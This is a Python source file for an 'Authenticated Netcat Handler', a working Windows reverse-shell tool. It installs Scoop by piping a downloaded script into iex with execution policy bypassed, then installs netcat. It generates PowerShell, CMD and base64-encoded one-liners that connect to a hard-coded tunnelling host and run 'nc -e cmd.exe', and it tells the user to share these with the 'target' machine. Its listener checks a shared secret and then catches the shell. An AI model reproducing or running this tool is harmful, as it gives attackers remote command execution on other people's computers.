import argparse
import base64
import socket
import signal
import sys
import subprocess
import os
import shutil

#Netcat Installer Start
def refresh_env_var():
    """Refreshes the PATH environment variable from the registry into the current process."""
    try:
        completed = subprocess.run(
            ['powershell', '-NoProfile', '-Command',
             '[System.Environment]::GetEnvironmentVariable("PATH", "User")'],
            capture_output=True, text=True
        )
        user_path = completed.stdout.strip()
        if user_path:
            os.environ['PATH'] = user_path + ";" + os.environ['PATH']
    except Exception as e:
        print(f"[!] Failed to refresh environment variables: {e}")

def install_netcat_with_scoop():
    """Installs Scoop and Netcat, refreshing environment variables after each install."""
    print("Netcat Installer Is running!!!")
    scoop_path = shutil.which("scoop")
    if not scoop_path:
        print("[+] Scoop not found. Installing Scoop...")

        try:
            subprocess.run([
                'powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command',
                'Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force; '
                'iwr -useb get.scoop.sh | iex'
            ], check=True)
        except subprocess.CalledProcessError as e:
            print(f"[!] Failed to install Scoop: {e}")
            sys.exit(1)

        print("[+] Scoop installed successfully. Refreshing environment variables...")
        refresh_env_var()

    else:
        print("[+] Scoop is already installed.")

    refresh_env_var()

    print("[+] Installing Netcat via Scoop...")
    try:
        subprocess.run(['scoop', 'install', 'netcat'], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to install Netcat: {e}")
        sys.exit(1)

    print("[+] Netcat installed successfully. Refreshing environment variables again...")
    refresh_env_var()

    nc_path = shutil.which("nc")
    if nc_path:
        print(f"[+] Netcat is available at: {nc_path}")
    else:
        print("[!] Netcat installation completed, but 'nc' not found in PATH.")
#Netcat Installer End


def encode_secret(secret: str) -> str:
    return base64.b64encode(secret.encode()).decode()

def decode_secret(encoded: str) -> str:
    return base64.b64decode(encoded.strip()).decode()

def handle_exit(sig, frame):
    print("\n[*] Exiting.")
    sys.exit(0)

signal.signal(signal.SIGINT, handle_exit)

def generate_command(secret, ip, port):
    encoded = encode_secret(secret)
    ps = (
        f'$ip="{ip}";'
        f'$port={port};'
        f'$b="{encoded}";'
        f'$resp = echo $b | nc $ip $port;'
        f'if ($resp -match "OK") {{ nc $ip $port -e cmd.exe }}'
    )
    print("\n[+] Powershell command:\n")
    print(ps)
    
    cmd = (
        f"powershell -Command "
        f"\"$ip='{ip}';"
        f"$port={port};"
        f"$b='{encoded}';"
        f"$resp = echo $b | nc $ip $port;"
        f"if ($resp -match 'OK') {{ nc $ip $port -e cmd.exe }}\""
    )
    print("\n[+] CMD command:\n")
    print(cmd)

    print("\n[+] For Script:\n")
    print(encode_secret(cmd))
    print("\n[!] Share this with the target Windows machine.\n")

def wait_for_auth(secret, port):
    encoded_expected = encode_secret(secret)
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(('', port))
            s.listen(1)
            print(f"[*] Listening for authentication on port {port}...")
            conn, addr = s.accept()
            with conn:
                print(f"[+] Connection from {addr}")
                try:
                    data = conn.recv(1024).decode().strip()
                    decoded = decode_secret(data)
                    if decoded == secret:
                        print("[✅] Authentication successful.")
                        conn.sendall(b"OK\n")
                        return
                    else:
                        print("[❌] Invalid secret.")
                        conn.sendall(b"FAIL\n")
                except Exception as e:
                    print(f"[!] Error: {e}")
                    conn.sendall(b"ERROR\n")

def wait_for_shell(port):
    print(f"[*] Waiting for shell connection on port {port}...")
    subprocess.call(["nc", "-nvlp", str(port)])

def main():
    parser = argparse.ArgumentParser(description="Authenticated Netcat Handler")
    parser.add_argument('--mode', choices=['generate', 'listen'], required=False)
    parser.add_argument('--secret', required=False, help="Shared secret")
    parser.add_argument("--install_nc", action="store_true", help="Install Netcat")
    parser.add_argument('--ip', help="Target IP (for generate mode)", default="very-easier.gl.at.ply.gg")
    parser.add_argument('--port', type=int, required=False, help="Port number", default=32368)

    args = parser.parse_args()

    if args.mode == "generate":
        if not args.ip:
            print("[!] IP is required in generate mode.")
            sys.exit(1)
        generate_command(args.secret, args.ip, args.port)

    elif args.mode == "listen":
        while True:
            wait_for_auth(args.secret, args.port)
            wait_for_shell(args.port)

    elif args.install_nc:
        install_netcat_with_scoop()

if __name__ == "__main__":
    main()
